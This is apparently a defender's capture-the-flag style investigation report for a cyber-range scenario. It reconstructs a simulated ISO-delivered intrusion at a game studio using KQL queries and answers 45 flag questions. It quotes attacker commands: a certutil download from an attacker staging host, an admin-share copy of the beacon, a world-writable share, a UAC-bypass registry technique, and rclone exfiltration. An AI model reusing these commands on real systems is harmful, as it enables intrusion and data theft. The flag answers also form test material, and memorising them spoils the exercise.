# SOC Incident Investigation: EmberForge : Source Leak

**Analyst:** Tiernan Falcon\
**Date Completed:** 4 April 2026 JST\
**Environment Investigated:** EmberForge Studios (`EC2AMAZ-B9GHHO6`, `EC2AMAZ-16V3AU4`, `EC2AMAZ-EEU3IA2`)\
**Timeframe:** 30 January 2026 (briefing) / 10 February 2026 UTC (actual telemetry: see note)\
**Platform:** Microsoft Sentinel: KQL / Log Analytics Workspace (`EmberForgeX_CL`)\
**Source:** Cyber Range, LogN Pacific

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Key Findings](#key-findings)
3. [Environment & Hunt Scope](#environment--hunt-scope)
4. [All Questions Quick Reference](#all-questions-quick-reference)
5. [Attack Timeline](#attack-timeline)
6. [Flag-by-Flag Analysis](#flag-by-flag-analysis)
7. [Conclusion](#conclusion)
8. [Remediation Recommendations](#remediation-recommendations)
9. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
10. [Final Thoughts & What I Learned](#final-thoughts--what-i-learned)
11. [Credits](#credits)
12. [Disclaimer](#disclaimer)

---

## Executive Summary

**EmberForge: Source Leak** documents a targeted intrusion against EmberForge Studios in which a threat actor delivered a malicious DLL inside a mounted ISO image, established command-and-control to infrastructure overlapping with the earlier BROKER and BUYER cases, escalated privileges through a `fodhelper.exe` UAC bypass, performed an LSASS credential dump, moved laterally across three hosts to reach the Domain Controller, extracted the Active Directory database, and exfiltrated proprietary source code for the unreleased title "Neon Shadows" to Mega cloud storage. Anti-forensic measures were applied on the Domain Controller, but Sysmon telemetry survived and provided the primary basis for reconstructing the full attack chain.

The intrusion began on Lisa Martin's workstation (`EC2AMAZ-B9GHHO6`). The user extracted a downloaded archive using `7zG.exe`, mounting the resulting ISO as drive `D:`, which caused `explorer.exe` to launch `rundll32.exe` loading `review.dll` directly. The ISO delivery bypassed Mark-of-the-Web and SmartScreen protections. Immediately after DLL execution, `update.exe` was dropped to `C:\Users\Public\` and became the attacker's primary tool for the rest of the operation. A first injection from `rundll32.exe` into `notepad.exe` concealed the initial foothold. The attacker then executed a UAC bypass via `fodhelper.exe` (using two registry modifications under `HKCU\Software\Classes\ms-settings`) and followed with a second, stable injection from `update.exe` into `spoolsv.exe` running as `NT AUTHORITY\SYSTEM`. Command-and-control was established to `cdn.cloud-endpoint.net`, resolving to `104.21.30.237`, the same `cloud-endpoint.net` domain family seen in the BROKER and BUYER investigations.

With SYSTEM access, the attacker dumped LSASS memory to `C:\Windows\System32\lsass.dmp` using `update.exe` directly, then ran structured AD discovery. The workstation became a staging point: a `tools` share was created at `C:\Users\Public\` and an SMB firewall rule was added. NTLM authentication attempts from the workstation to the server failed before the attacker pivoted to pushing `update.exe` via the `C$` admin share and triggering execution through a temporary service named `pGJLIKnC`. From the server, `certutil.exe` pulled additional tools from `sync.cloud-endpoint.net:8080`. The same remote-service pattern then reached the Domain Controller.

On the DC (`EC2AMAZ-EEU3IA2`), `vssadmin.exe` created a shadow copy to extract `ntds.dit`. A backdoor account `svc_backup` was created with the password `P@ssw0rd123!` and added to Domain Admins. A drive mapping back to the workstation tool share exposed `EmberForge2024!` in plaintext. Source code in `C:\GameDev` was archived via `Compress-Archive` as `gamedev.zip` and exfiltrated from the server via `rclone.exe` to a Mega account (`jwilson.vhr@proton.me`), with the password `Summer2024!` exposed in an early rclone command-line attempt. Persistence was established through a `WindowsUpdate` scheduled task and a silently-configured AnyDesk instance. The attacker then used `wevtutil.exe` to clear the Security and System event logs on the DC.

> **Analyst Note : Timestamp Drift:** The briefing stated the attack window as 30 January 2026. Actual telemetry timestamps in `EmberForgeX_CL` reflect the ingestion date of 10 February 2026, with events clustered between approximately 22:35–22:43 UTC. All queries required adjustment to the real ingestion window. Times in this report reflect actual `TimeGenerated` values in the logs.

This investigation was reconstructed exclusively from `EmberForgeX_CL` in Microsoft Sentinel. No direct endpoint access, memory forensics, packet capture, or disk imaging was available.

## Hunt Narrative

**Phases 1–2: Impact Scoping, Exfiltration, and Initial Access**

We started with the business harm. The CISO brief established that source code was already on the dark web, so we led with collection and transfer activity. `Compress-Archive` activity pointed directly to `C:\GameDev` as the staged data source, and `rclone.exe` executions showed the upload path to Mega. Reviewing all rclone command lines surfaced the Mega account (`jwilson.vhr@proton.me`) and, in an early failed authentication attempt, the plaintext password `Summer2024!`. Network telemetry tied the successful upload to `66.203.125.15`. The staging server `sync.cloud-endpoint.net:8080` appeared consistently in tool download commands, and the C2 domain `cdn.cloud-endpoint.net` (resolving to `104.21.30.237`) belongs to the same infrastructure family seen in BROKER and BUYER.

Working backward to initial access, file creation events on the workstation showed `7zG.exe` extracting an archive into `C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\`, followed by `explorer.exe` mounting the ISO as drive `D:` and `rundll32.exe` loading `review.dll` from it. The execution chain was `explorer.exe > rundll32.exe > review.dll` with no cmd.exe intermediary, the ISO triggered rundll32 directly through the shell.

**Phases 3–4: Payload, Injection, and Privilege Escalation**

After DLL execution, `update.exe` appeared in `C:\Users\Public\`. DNS telemetry from `update.exe` established C2. The first injection went from `rundll32.exe` into `notepad.exe`. The attacker then modified `HKCU\Software\Classes\ms-settings\shell\open\command` in two steps (setting the command path and adding the `DelegateExecute` value) causing `fodhelper.exe` to run the elevated beacon. That beacon then injected from `update.exe` into `spoolsv.exe` as `NT AUTHORITY\SYSTEM`. `update.exe` dumped LSASS to `C:\Windows\System32\lsass.dmp`.

**Phases 5–6: Discovery, Lateral Movement, and Domain Compromise**

Discovery ran in quick sequence: `net user /domain`, `net group "Domain Admins" /domain`, `nltest /dclist:emberforge.local`. The workstation was staged with the `tools` share and an SMB firewall rule. NTLM auth failures preceded a successful pivot via the `C$` admin share and the temporary service `pGJLIKnC`. On the server, `certutil.exe` pulled tools from `sync.cloud-endpoint.net:8080`. The DC was reached via the same pattern, `ntds.dit` was extracted, `svc_backup` was created and elevated, and the tool share was accessed using `EmberForge2024!` in plaintext. After exfiltration and persistence, `wevtutil.exe` cleared Security and System on the DC.

---

## Key Findings

- Confirmed data exfiltration of "Neon Shadows" source code from `C:\GameDev`, staged as `gamedev.zip` via `Compress-Archive` and uploaded to Mega via `rclone.exe` to IP `66.203.125.15`
- Attacker OPSEC failure: Mega account `jwilson.vhr@proton.me` and password `Summer2024!` exposed in plaintext in `rclone` command-line telemetry
- Domain Controller fully compromised: `ntds.dit` extracted via `vssadmin.exe` shadow copy on `EC2AMAZ-EEU3IA2`; all domain credentials for `emberforge.local` must be treated as exposed
- Initial access via ISO delivery: `review.dll` loaded by `rundll32.exe` from mounted drive `D:`, bypassing SmartScreen; patient zero confirmed as `lmartin` on `EC2AMAZ-B9GHHO6`
- Execution chain: `explorer.exe > rundll32.exe > review.dll`; preceded by `7zG.exe` extraction to `C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review\`
- Primary beacon `C:\Users\Public\update.exe` dropped immediately after DLL execution
- C2 to `cdn.cloud-endpoint.net` (`104.21.30.237`), same `cloud-endpoint.net` infrastructure family as BROKER and BUYER
- First injection: `rundll32.exe > notepad.exe`; stable SYSTEM injection: `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)`
- UAC bypass via `fodhelper.exe` using `DelegateExecute` registry value under `HKCU\Software\Classes\ms-settings\shell\open\command`
- LSASS dump performed by `update.exe`; output at `C:\Windows\System32\lsass.dmp`
- Lateral movement to SERVER (`EC2AMAZ-16V3AU4`) via `C$` admin share and psexec-style temporary service `pGJLIKnC` (EventCode 7045)
- NTLM authentication failures from workstation to server confirmed before successful pivot
- Server tool retrieval via `certutil.exe` LOLBin from `sync.cloud-endpoint.net:8080`
- Backdoor account `svc_backup` created on DC with password `P@ssw0rd123!` in plaintext; immediately added to Domain Admins
- Second exposed credential: `EmberForge2024!` visible in `net use` drive mapping command on DC
- Persistence via scheduled task `WindowsUpdate` and silently-configured AnyDesk (`C:\ProgramData\AnyDesk\system.conf`)
- Anti-forensics: `wevtutil.exe` cleared Security and System on DC; Sysmon survived as the sole DC-side evidence source
- 45 flags resolved across 6 attack phases spanning three compromised hosts

---

## Environment & Hunt Scope

#### Monitored Systems

- `EC2AMAZ-B9GHHO6` (10.1.173.145, WORKSTATION): Patient zero; Lisa Martin's endpoint; initial access, beacon drop, UAC bypass, LSASS dump, discovery, lateral movement launch
- `EC2AMAZ-16V3AU4` (10.1.57.66, SERVER): Lateral movement target; tool staging; `rclone` exfiltration origin
- `EC2AMAZ-EEU3IA2` (10.1.160.76, DC): Domain Controller; `ntds.dit` extraction, backdoor account creation, log clearing

#### Data Sources Available

- `EmberForgeX_CL`: Single custom log table containing Sysmon and Windows Security events across all three hosts
  - EventCode 1 / 4688, Process creation: command line, parent process, user
  - EventCode 3, Network connections
  - EventCode 8, `CreateRemoteThread` (source/target parsed from `Raw_s`)
  - EventCode 11, File created
  - EventCode 13, Registry value set
  - EventCode 22, DNS query (resolved IPs parsed from `Raw_s`)
  - EventCode 7045, Service installation (service name parsed from `Raw_s`)

#### Investigation Constraints

- **Critical timestamp issue:** `TimeGenerated` reflects ingestion date (10 February 2026), not event date. Actual events occurred ~22:35–22:43 UTC on 10 February 2026. All queries must use `TimeGenerated` in the real ingestion window, not the briefed attack date of 30 January 2026.
- No direct endpoint access, memory forensics, disk imaging, or packet capture
- Security and System logs on DC were cleared by the attacker; Sysmon survived

---

## All Questions Quick Reference

| Q | Section | Flag Name | Answer / Finding |
|---|---|---|---|
| Q00 | Environment Access | Table Name | `EmberForgeX_CL` |
| Q01 | Impact Assessment | Target Directory | `C:\GameDev` |
| Q02 | Impact Assessment | Exfil Destination | `mega` |
| Q03 | Impact Assessment | Attacker Attribution | `jwilson.vhr@proton.me` |
| Q04 | Impact Assessment | Domain Compromise Evidence | `ntds.dit` |
| Q05 | Exfiltration | Exfil Tool | `rclone.exe` |
| Q06 | Exfiltration | Exfil Destination IP | `66.203.125.15` |
| Q07 | Exfiltration | Attacker Credential Exposure | `Summer2024!` |
| Q08 | Exfiltration | Archive Method | `Compress-Archive` |
| Q09 | Exfiltration | Staging Server | `sync.cloud-endpoint.net` |
| Q10 | Initial Access | Malicious File | `review.dll` |
| Q11 | Initial Access | Delivery Vector | `D:` |
| Q12 | Initial Access | Compromised User | `lmartin` |
| Q13 | Initial Access | Execution Chain | `explorer.exe > rundll32.exe > review.dll` |
| Q14 | Initial Access | Delivery Unpacking | `7zG.exe > C:\Users\lmartin.EMBERFORGE\Downloads\EmberForge_Review` |
| Q15 | Execution & C2 | Dropped Payload | `C:\Users\Public\update.exe` |
| Q16 | Execution & C2 | C2 Domain | `cdn.cloud-endpoint.net` |
| Q17 | Execution & C2 | Primary C2 IP | `104.21.30.237` |
| Q18 | Execution & C2 | Injection Chain | `rundll32.exe > notepad.exe` |
| Q19 | Privilege Escalation | UAC Bypass Binary | `fodhelper.exe` |
| Q20 | Privilege Escalation | Registry Bypass Enabler | `DelegateExecute` |
| Q21 | Privilege Escalation | Stable Injection Chain | `update.exe > spoolsv.exe (NT AUTHORITY\SYSTEM)` |
| Q22 | Credential Access | Credential Dumping Process | `update.exe` |
| Q23 | Credential Access | Dump Location | `C:\Windows\System32\lsass.dmp` |
| Q24 | Discovery | User Enumeration | `net user /domain` |
| Q25 | Discovery | Privilege Enumeration | `net group "Domain Admins" /domain` |
| Q26 | Discovery | Infrastructure Mapping | `nltest /dclist:emberforge.local` |
| Q27 | Lateral Movement | Tool Staging Share | `net share tools=C:\Users\Public /grant:everyone,full` |
| Q28 | Lateral Movement | Firewall Manipulation | `SMB` |
| Q29 | Lateral Movement | Post-Escalation Parent | `spoolsv.exe` |
| Q30 | Lateral Movement | Beacon Distribution | `cmd.exe /c copy C:\Users\Public\update.exe \\10.1.57.66\C$\Users\Public\update.exe` |
| Q31 | Lateral Movement | LOLBin Tool Staging | `certutil.exe > http://sync.cloud-endpoint.net:8080/update.exe` |
| Q32 | Lateral Movement | Remote Execution Evidence | `pGJLIKnC` |
| Q33 | Lateral Movement | First Command on Server | `whoami` |
| Q34 | Lateral Movement | Failed Lateral Movement | `NTLM` |
| Q35 | Domain Compromise | DC Arrival & Credential Extraction | `whoami > vssadmin.exe` |
| Q36 | Domain Compromise | Backdoor Account | `svc_backup` |
| Q37 | Domain Compromise | Backdoor Credentials | `P@ssw0rd123!` |
| Q38 | Domain Compromise | Privilege Assignment | `Domain Admins` |
| Q39 | Domain Compromise | Exposed Credential | `EmberForge2024!` |
| Q40 | Persistence | Scheduled Task | `WindowsUpdate` |
| Q41 | Persistence | Remote Access Tool | `AnyDesk` |
| Q42 | Persistence | Remote Access Configuration | `C:\ProgramData\AnyDesk\system.conf` |
| Q43 | Anti-Forensics | Anti-Forensics Tool | `wevtutil.exe` |
| Q44 | Anti-Forensics | Cleared Logs | `Security, System` |

---

## Attack Timeline

> **Analyst Note:** Timestamps below reflect actual `TimeGenerated` values in `EmberForgeX_CL` (ingestion date 10 February 2026). The briefing's stated attack date of 30 January 2026 did not match the telemetry. All queries required this window adjustment.

| Time (UTC) | Host | Tactic | Action | Key artifact |
|---|---|---|---|---|
| ~22:35 | WKS (.145) | Initial Access | `7zG.exe` extracts archive; ISO mounted as `D:`; `rundll32.exe` loads `review.dll` | `review.dll`, `D:`, `lmartin` |
| ~22:35 | WKS (.145) | Execution | `C:\Users\Public\update.exe` dropped by `review.dll` | `update.exe` |
| ~22:35 | WKS (.145) | Command & Control | `update.exe` beacons to `cdn.cloud-endpoint.net` | `104.21.30.237` |
| ~22:35 | WKS (.145) | Defense Evasion | `rundll32.exe` injects into `notepad.exe` via CreateRemoteThread | EventCode 8 |
| ~22:39 | WKS (.145) | Privilege Escalation | `DelegateExecute` registry write; `fodhelper.exe` hijacked; elevation achieved | `fodhelper.exe`, `DelegateExecute` |
| ~22:39 | WKS (.145) | Defense Evasion | `update.exe` injects into `spoolsv.exe (NT AUTHORITY\SYSTEM)` | EventCode 8 |
| ~22:42 | WKS (.145) | Credential Access | `update.exe` dumps LSASS to `C:\Windows\System32\lsass.dmp` | `lsass.dmp` |
| ~22:39 | WKS (.145) | Discovery | `net user /domain`, `net group "Domain Admins" /domain`, `nltest /dclist` | `nltest /dclist:emberforge.local` |
| ~22:39 | WKS (.145) | Lateral Movement | `tools` share created (`C:\Users\Public`); SMB firewall rule added | `pGJLIKnC` rule `SMB` |
| ~22:39 | WKS (.145) | Lateral Movement | NTLM auth failures to SERVER; pivot method switched | EventCode 4625 |
| ~22:39 | WKS (.145) | Lateral Movement | `update.exe` copied to SERVER via `C$` admin share | `\\10.1.57.66\C$\...` |
| ~22:38 | SRV (.66) | Lateral Movement | Temporary service `pGJLIKnC` installed; beacon executes | EventCode 7045 |
| ~22:38 | SRV (.66) | Discovery | First command on server: `whoami` | `whoami` |
| ~22:38 | SRV (.66) | Ingress Tool Transfer | `certutil.exe` downloads from `sync.cloud-endpoint.net:8080` | `certutil.exe` |
| ~22:38 | SRV (.66) | Exfiltration | `rclone.exe` uploads `gamedev.zip` to Mega; IP `66.203.125.15` | `jwilson.vhr@proton.me` |
| ~22:35 | DC (.76) | Lateral Movement | Same remote-service pattern reaches Domain Controller | `EC2AMAZ-EEU3IA2` |
| ~22:35 | DC (.76) | Discovery | First command on DC: `whoami` | `whoami` |
| ~22:37 | DC (.76) | Credential Access | `vssadmin.exe` creates shadow copy; `ntds.dit` extracted | `ntds.dit` |
| ~22:37 | DC (.76) | Persistence | `svc_backup` created; added to Domain Admins | `svc_backup`, `P@ssw0rd123!` |
| ~22:37 | DC (.76) | Lateral Movement | Drive mapped to workstation tool share; credential exposed in plaintext | `EmberForge2024!` |
| ~22:43 | WKS (.145) | Persistence | `WindowsUpdate` scheduled task created; AnyDesk configured | `WindowsUpdate`, `system.conf` |
| ~22:43 | DC (.76) | Anti-Forensics | `wevtutil.exe` clears Security and System logs on DC | `wevtutil.exe` |

### Kill Chain Diagram

```mermaid
flowchart LR
    A["ISO Delivery<br/>7zG.exe extracts<br/>D:\\review.dll"] --> B["Beacon Drop<br/>C:\\Users\\Public\\update.exe"]
    B --> C["C2 Established<br/>cdn.cloud-endpoint.net<br/>104.21.30.237"]
    C --> D["Injection 1<br/>rundll32.exe > notepad.exe"]
    D --> E["UAC Bypass<br/>fodhelper.exe + DelegateExecute"]
    E --> F["Injection 2<br/>update.exe > spoolsv.exe<br/>NT AUTHORITY\\SYSTEM"]
    F --> G["Credential Access<br/>update.exe > lsass.dmp"]
    G --> H["Discovery<br/>net user, nltest, net group"]
    H --> I["Lateral Movement<br/>C$ share + service pGJLIKnC"]
    I --> J["DC Compromise<br/>vssadmin + ntds.dit"]
    J --> K["Persistence<br/>svc_backup + AnyDesk + WindowsUpdate"]
    K --> L["Exfiltration<br/>rclone > Mega 66.203.125.15"]
    L --> M["Anti-Forensics<br/>wevtutil cl Security + System"]
```



---

## Flag-by-Flag Analysis

---

### 🚩 Q00: Environment Access | Table Name

**Objective**\
Confirm access to the investigation workspace and identify the custom log table containing all event data.

**Hunt Question**\
What is the name of the custom log table?

**Answer:** `EmberForgeX_CL`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-01-01 00:00:00) .. datetime(2026-04-04 00:00:00))
| take 10
```

**Key Observations**
- `EmberForgeX_CL` is visible under Custom Logs in the Sentinel interface; the `_CL` suffix is standard for API-ingested tables.
- A `take 10` confirmed the schema and revealed the timestamp drift issue: `TimeGenerated` showed 10 February 2026, not the briefed attack date.

**Analysis**\
Confirming the table and checking `TimeGenerated` values immediately is what surfaces the timestamp drift issue. Catching it here prevented the rest of the hunt from returning empty results against the wrong time window.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | None |
| Technique | N/A: Environment familiarisation |

---

### 🚩 Q01: Impact Assessment | Target Directory

**Objective**\
Identify the source directory from which the attacker staged stolen data.

**Hunt Question**\
What directory was the source of the stolen data?

**Answer:** `C:\GameDev`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 21:00:00) .. datetime(2026-02-11 00:00:00))
| where CommandLine_s has_any ("zip", "tar", "gz")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip` appeared in process telemetry.
- The directory name confirms this was a targeted operation against the studio's development assets.

**Analysis**\
Leading with impact rather than initial access is the correct methodology when the breach is already known. `C:\GameDev` is the primary scope artifact for breach notification, everything else contextualises how it left, not whether it did.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Collection |
| Technique | T1074.001: Data Staged: Local Data Staging |

---

### 🚩 Q02: Impact Assessment | Exfil Destination

**Objective**\
Identify the cloud storage service that received the stolen data.

**Hunt Question**\
What cloud provider received the stolen data?

**Answer:** `mega`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 21:00:00) .. datetime(2026-02-11 00:00:00))
| where CommandLine_s has_any ("zip", "tar", "gz")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- The `rclone` command line included `mega:exfil` as the destination remote.
- Multiple executions appeared, some failing on authentication before a successful upload completed.

**Analysis**\
Mega is commonly abused for exfiltration because of its end-to-end encryption. Identifying the provider enables a takedown request to Mega's abuse team and initiates a legal process for any preserved data.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Exfiltration |
| Technique | T1567.002: Exfiltration Over Web Service: Exfiltration to Cloud Storage |

---

### 🚩 Q03: Impact Assessment | Attacker Attribution

**Objective**\
Recover the attacker's cloud authentication email from command-line telemetry.

**Hunt Question**\
What email account was used to authenticate to the cloud service?

**Answer:** `jwilson.vhr@proton.me`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where EventCode_s in ("1", "4688")
| where CommandLine_s has ("rclone")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- The `rclone` command line exposed `jwilson.vhr@proton.me` as the authenticating Mega account.
- ProtonMail is consistent with an attacker seeking account-level anonymity.

**Analysis**\
`jwilson.vhr@proton.me` was captured permanently in Sysmon process creation telemetry at execution time. It survived the DC log clearing because it was recorded on the server, not the DC. It is now a stable attribution artifact for law enforcement referral and a critical mistake by the attacker.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Exfiltration |
| Technique | T1567.002: Exfiltration Over Web Service: Exfiltration to Cloud Storage |

---

### 🚩 Q04: Impact Assessment | Domain Compromise Evidence

**Objective**\
Confirm domain-level credential theft by identifying the system file targeted on the Domain Controller.

**Hunt Question**\
What file did the attacker access via volume snapshot techniques?

**Answer:** `ntds.dit`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 21:00:00) .. datetime(2026-02-11 00:00:00))
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("ntds.dit", "vssadmin", "ntdsutil", "diskshadow", "shadow")
| project TimeGenerated, Computer, User_s, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- The file cannot be copied directly while Active Directory is running; the shadow copy technique bypasses the OS lock.

**Analysis**\
`ntds.dit` contains hashed credentials for every account in `emberforge.local`. Its extraction means the entire domain must be treated as compromised. The password reset scope is the whole environment.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Credential Access |
| Technique | T1003.003: OS Credential Dumping: NTDS |

---

### 🚩 Q05: Exfiltration | Exfil Tool

**Objective**\
Identify the binary used to upload staged data to the cloud storage service.

**Hunt Question**\
What tool filename was used to exfiltrate the stolen data?

**Answer:** `rclone.exe`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where EventCode_s in ("1", "4688")
| where CommandLine_s has ("rclone")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `rclone.exe` was found on `EC2AMAZ-16V3AU4` (the server), confirming exfiltration originated there rather than from the initial workstation.
- Multiple executions showed troubleshooting before a successful upload, a pattern consistent with interactive attacker activity.

**Analysis**\
`rclone` appearing multiple times in a short window alongside Mega remote targets is a clear exfiltration signal. The repeated executions indicate interactive credential troubleshooting, which generates the friction-derived telemetry most useful for hunting.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Exfiltration |
| Technique | T1567.002: Exfiltration Over Web Service: Exfiltration to Cloud Storage |

---

### 🚩 Q06: Exfiltration | Exfil Destination IP

**Objective**\
Confirm the IP address that received the exfiltrated data.

**Hunt Question**\
What IP address received the stolen data?

**Answer:** `66.203.125.15`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:40:00) .. datetime(2026-02-10 23:00:00))
| where EventCode_s == "3"
| where Image_s has "rclone"
| project TimeGenerated, Computer, DestinationIp_s, DestinationPort_s
```

**Key Observations**
- Network telemetry correlated `rclone.exe` with outbound HTTPS connections to `66.203.125.15`.
- This IP resolves to Mega infrastructure.

**Analysis**\
The destination IP should be submitted to Mega's abuse team and shared with law enforcement. HTTPS on port 443 for Mega traffic would not have triggered egress filtering in most environments, making this exfiltration path blend into normal web traffic.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Exfiltration |
| Technique | T1567.002: Exfiltration Over Web Service: Exfiltration to Cloud Storage |

---

### 🚩 Q07: Exfiltration | Attacker Credential Exposure

**Objective**\
Recover the plaintext password exposed in rclone command-line telemetry.

**Hunt Question**\
What plaintext password was exposed?

**Answer:** `Summer2024!`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-09 22:40:00) .. datetime(2026-02-11 23:00:00))
| where CommandLine_s has ("pass")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- An early `rclone` execution passed the password `Summer2024!` directly on the command line.
- Later executions used a pre-configured profile, no longer exposing the credential in plaintext.

**Analysis**\
The troubleshooting pattern (interactive credential attempt, failure, reconfiguration, success) is exactly the behaviour that leaves permanent records in process telemetry. `Summer2024!` is now a stable artifact regardless of any subsequent account changes.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Exfiltration |
| Technique | T1567.002: Exfiltration Over Web Service: Exfiltration to Cloud Storage |

---

### 🚩 Q08: Exfiltration | Archive Method

**Objective**\
Identify the built-in PowerShell cmdlet used to compress the source code before exfiltration.

**Hunt Question**\
What PowerShell cmdlet created the archive?

**Answer:** `Compress-Archive`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-09 22:40:00) .. datetime(2026-02-11 23:00:00))
| where CommandLine_s has ("zip")
| project TimeGenerated, Computer, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- The full command was `Compress-Archive -Path C:\GameDev -DestinationPath C:\Users\Public\gamedev.zip`.
- Output landed in `C:\Users\Public\`, the same staging directory as `update.exe` and `rclone.exe`.

**Analysis**\
`Compress-Archive` is native PowerShell. It requires no additional binaries and leaves no installation artifact. Using it over a third-party archiver is consistent with the living-off-the-land preference maintained throughout this operation.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Collection |
| Technique | T1560.001: Archive Collected Data: Archive via Utility |

---

### 🚩 Q09: Exfiltration | Staging Server

**Objective**\
Identify the attacker-controlled infrastructure used to distribute tools across the environment.

**Hunt Question**\
What staging server domain appeared consistently across the environment?

**Answer:** `sync.cloud-endpoint.net`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:30:00) .. datetime(2026-02-10 23:00:00))
| where EventCode_s in ("1", "4688")
| where CommandLine_s has_any ("certutil", "bitsadmin", "curl", "wget", "Invoke-WebRequest", "iwr", "WebClient")
    and CommandLine_s has_any ("http://", "https://", "ftp://")
| project TimeGenerated, Computer, Image_s, CommandLine_s
| sort by TimeGenerated asc
```

**Key Observations**
- `sync.cloud-endpoint.net:8080` appeared in `certutil.exe` download commands on the server.
- This is the same `cloud-endpoint.net` domain family as the C2 domain (`cdn.cloud-endpoint.net`) and the same family seen in BROKER and BUYER.

**Analysis**\
The `cloud-endpoint.net` infrastructure overlap with BROKER and BUYER is the most significant cross-case analytical finding in this hunt. Whether this indicates the same threat actor or shared tooling, the IOC family has now appeared across three investigations and should be treated as a priority block and threat intelligence flag.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Command and Control |
| Technique | T1105: Ingress Tool Transfer |

---

### 🚩 Q10: Initial Access | Malicious File

**Objective**\
Identify the malicious DLL that initiated the intrusion chain.

**Hunt Question**\
What file was loaded by a Windows utility at the start of the intrusion?

**Answer:** `review.dll`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:00:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-B9GHHO6"
| where EventCode_s in ("1", "4688")
| where Image_s has "rundll32"
| project TimeGenerated, ParentImage_s, Image_s, CommandLine_s, User_s
| sort by TimeGenerated asc
```

**Key Observations**
- `review.dll` was loaded from drive `D:` via `rundll32.exe`, with `explorer.exe` as the parent.
- The name `review.dll` sounds like a project asset in a game development context, plausible to the target role.

**Analysis**\
`rundll32.exe` loading a DLL from a virtual drive path is a reliable detection signal. The filename was chosen for the victim environment; this is targeted delivery, not mass phishing.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Execution |
| Technique | T1218.011: System Binary Proxy Execution: Rundll32 |

---

### 🚩 Q11: Initial Access | Delivery Vector

**Objective**\
Confirm the delivery mechanism by identifying the drive letter from which the DLL was loaded.

**Hunt Question**\
What drive letter contained the malicious file?

**Answer:** `D:`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:00:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-B9GHHO6"
| where EventCode_s in ("1", "4688")
| where Image_s has "rundll32"
| project TimeGenerated, CommandLine_s, User_s
| sort by TimeGenerated asc
```

**Key Observations**
- `CommandLine_s` showed `D:\review.dll` as the path passed to `rundll32.exe`.
- Drive `D:` on an EC2 instance without additional volumes indicates a mounted ISO image.
- ISO delivery bypasses Mark-of-the-Web: content inside a mounted disk image does not inherit the downloaded file's web zone marker.

**Analysis**\
ISO smuggling sidesteps SmartScreen controls that apply to downloaded executables. Once opened, the ISO mounts as a virtual drive and its contents appear as local media. The `D:` indicator is the clean forensic marker for this technique.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Defense Evasion |
| Technique | T1553.005: Subvert Trust Controls: Mark-of-the-Web Bypass |

---

### 🚩 Q12: Initial Access | Compromised User

**Objective**\
Confirm which user account executed the initial payload, patient zero.

**Hunt Question**\
Which user account executed the malicious file?

**Answer:** `lmartin`

**Query Used**
```kql
EmberForgeX_CL
| where TimeGenerated between (datetime(2026-02-10 22:00:00) .. datetime(2026-02-10 23:00:00))
| where Computer startswith "EC2AMAZ-B9GHHO6"
| where EventCode_s in ("1", "4688")
| where Image_s has "rundll32"
| project TimeGenerated, CommandLine_s, User_s
| sort by TimeGenerated asc
```

**Key Observations**
- `User_s` showed `lmartin` (full profile path: `C:\Users\lmartin.EMBERFORGE\`) as the executing account.
- The CISO brief named Lisa Martin as the user reporting strange behaviour, telemetry confirms this.

**Analysis**\
Confirming patient zero establishes the initial delivery scope. The ISO payload named `EmberForge_Review` was tailored to a Lead Artist's workflow, indicating deliberate targeting of this specific user.

**MITRE ATT&CK Mapping**

| Field | Value |
|---|---|
| Tactic | Initial Access |
| Technique | T1566.001: Phishing: Spearphishing Attachment |

---

